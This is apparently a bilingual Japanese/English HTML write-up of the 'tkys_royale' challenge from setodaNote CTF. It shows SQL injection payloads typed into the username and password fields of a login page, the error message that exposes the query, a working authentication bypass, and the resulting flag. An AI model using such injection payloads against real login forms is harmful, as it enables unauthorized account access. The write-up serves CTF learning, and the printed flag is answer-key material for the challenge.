@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>tkys_royale (setodaNote CTF) Writeup</title>
+<script src="../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>tkys_royale</h1>
+<span class="language-selector-ja">
+<p>
+WebページのURLが与えられた。
+</p><p>
+アクセスすると、usernameの入力欄、passwordの入力欄、Loginボタンがあった。
+</p><p>
+usernameに<code>' or 1=1 --</code>、passwordに<code>a</code>を入力してLoginボタンを押すと、以下が表示された。
+</p>
+</span>
+<span class="language-selector-en">
+<p>
+An URL of a web page was given.
+</p><p>
+Hitting the Login button with username <code>' or 1=1 --</code> and password <code>a</code>, this was displayed:
+</p>
+</span>
+<blockquote>
+<p>
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'a'' at line 1
+</p><p>
+Query: SELECT * From basic_accounts where username='' or 1=1 --' and password='a'
+</p><p>
+Nice try!
+</p>
+</blockquote>
+
+<p class="language-selector-ja">
+usernameに<code>' or ('1'='1</code>、passwordに<code>a') or '1'='1</code>を入力してLoginボタンを押すと、以下が表示された。
+</p>
+<p class="language-selector-en">
+Hitting the Login button with username <code>' or ('1'='1</code> and password <code>a') or '1'='1</code>, this was displayed:
+</p>
+<blockquote>
+<p>
+Welcome admin!!
+</p><p>
+flag{SQLi_with_b1rds_in_a_b34utiful_landscape}
+</p><p>
+Excellent work!! This is the flag!
+</p>
+</blockquote>
+
+<p class="language-selector-ja">
+この中にflagが含まれていた。
+</p>
+<p class="language-selector-en">
+This display contained the flag.
+</p>
+
+<div class="flag">flag{SQLi_with_b1rds_in_a_b34utiful_landscape}</div>
+<hr>
+<p>
+<a href="../../" class="language-aware-link">setodaNote CTF</a>
+</p>
+</body>
+</html>
